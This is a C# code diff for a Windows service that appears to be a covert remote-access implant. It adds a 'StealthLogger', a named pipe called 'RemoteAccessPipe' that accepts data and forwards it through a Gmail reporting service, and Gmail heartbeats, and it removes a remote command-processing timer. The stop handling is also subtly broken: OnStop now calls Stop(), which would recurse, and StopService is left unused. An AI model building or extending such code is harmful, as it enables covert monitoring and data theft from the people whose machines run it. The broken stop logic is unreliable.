@@ -4,16 +4,20 @@ using System.IO.Pipes;
 using System.ServiceProcess;
 using System.Threading;
 
+using WinSvc.Configuration;
+using WinSvc.Core;
+using WinSvc.Services;
+
 namespace WinSvc;
 
 public partial class Service1 : ServiceBase
 {
     private Thread _pipeThread;
     private volatile bool _running;
-    private Timer _commandTimer;
-    private Timer _heartbeatTimer;
-    private ServiceImpl _serviceImpl;
-    private ImapGmailClient _imapClient;
+    private Timer _heartbeat;
+    private StateManager _state;
+    private StealthLogger _logger;
+    private GmailReportService _gmail;
 
     public Service1()
     {
@@ -21,35 +25,34 @@ public partial class Service1 : ServiceBase
     }
 
     protected override void OnStart(string[] args) => StartService();
-    protected override void OnStop() => StopService();
-
+    protected override void OnStop() => Stop();
     public void DebugStart(string[] args) => StartService();
-    public void DebugStop() => StopService();
+    public void DebugStop() => Stop();
 
     private void StartService()
     {
         try
         {
-            _imapClient = new ImapGmailClient();
-            _imapClient.Initialize();
+            _state = new StateManager();
+            _logger = new StealthLogger(_state);
+            var config = new GmailConfig();
+            _gmail = new GmailReportService(config, _logger, _state);
+
+            if (!_gmail.Initialize())
+            {
+                _logger.Error("Gmail init failed, will retry");
+            }
 
             _running = true;
-            _pipeThread = new Thread(ListenForExtendedInfo) { IsBackground = true };
+            _pipeThread = new Thread(PipeListener) { IsBackground = true };
             _pipeThread.Start();
 
-            _serviceImpl = new ServiceImpl();
-
-            _commandTimer = new Timer(
-                _ => ProcessCommands(), null, 10000, 60000);
-
-            _heartbeatTimer = new Timer(
-                _ => SafeHeartbeat(), null, 0, 60000);
-
-            Log("Service started");
+            _heartbeat = new Timer(_ => SafeHeartbeat(), null, 60000, 60000);
+            _logger.Info("Service started");
         }
         catch (Exception ex)
         {
-            Log($"Start failed: {ex.Message}");
+            _logger.Error("Start failed", ex);
             throw;
         }
     }
@@ -57,61 +60,43 @@ public partial class Service1 : ServiceBase
     private void StopService()
     {
         _running = false;
-        _commandTimer?.Dispose();
-        _heartbeatTimer?.Dispose();
+        _heartbeat?.Dispose();
         _pipeThread?.Join(5000);
-        Log("Service stopped");
+        _gmail?.Dispose();
+        _logger.Info("Service stopped");
     }
 
-    private void ListenForExtendedInfo()
+    private void PipeListener()
     {
         while (_running)
         {
             try
             {
-                using (var server = new NamedPipeServerStream(
-                    "RemoteAccessPipe",
-                    PipeDirection.InOut,
-                    1,
-                    PipeTransmissionMode.Byte,
-                    PipeOptions.Asynchronous))
+                using (var pipe = new NamedPipeServerStream("RemoteAccessPipe", PipeDirection.InOut, 1))
                 {
-                    server.WaitForConnection();
-
-                    var reader = new StreamReader(server);
-                    var writer = new StreamWriter(server) { AutoFlush = true };
-
-                    var request = reader.ReadLine();
-                    if (request == "GET_EXTENDED_INFO")
+                    pipe.WaitForConnection();
+                    using (var reader = new StreamReader(pipe))
+                    using (var writer = new StreamWriter(pipe) { AutoFlush = true })
                     {
-                        writer.WriteLine("OK");
-                        var json = reader.ReadToEnd();
-
-                        if (!string.IsNullOrWhiteSpace(json))
+                        var req = reader.ReadLine();
+                        if (req == "GET_EXTENDED_INFO")
                         {
-                            _imapClient.SendExtendedReport(json);
-                            writer.WriteLine("SENT");
+                            writer.WriteLine("OK");
+                            var data = reader.ReadToEnd();
+                            if (!string.IsNullOrWhiteSpace(data))
+                            {
+                                _gmail.SendExtendedReport(data);
+                                writer.WriteLine("SENT");
+                            }
                         }
                     }
                 }
             }
             catch (Exception ex)
             {
-                Log($"Pipe error: {ex.Message}");
+                _logger.Error("Pipe error", ex);
                 Thread.Sleep(1000);
             }
-        }
-    }
-
-    private void ProcessCommands()
-    {
-        try
-        {
-            _serviceImpl.ProcessCommands();
-        }
-        catch (Exception ex)
-        {
-            Log($"Command error: {ex.Message}");
         }
     }
 
@@ -119,20 +104,11 @@ public partial class Service1 : ServiceBase
     {
         try
         {
-            _imapClient.UpdateHeartbeat();
+            _gmail.SendHeartbeat();
         }
         catch (Exception ex)
         {
-            Log($"Heartbeat error: {ex.Message}");
+            _logger.Error("Heartbeat failed", ex);
         }
-    }
-
-    private void Log(string message)
-    {
-#if DEBUG
-        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] {message}");
-#else
-        EventLog.WriteEntry("RemoteAccessService", message, EventLogEntryType.Information);
-#endif
     }
 }
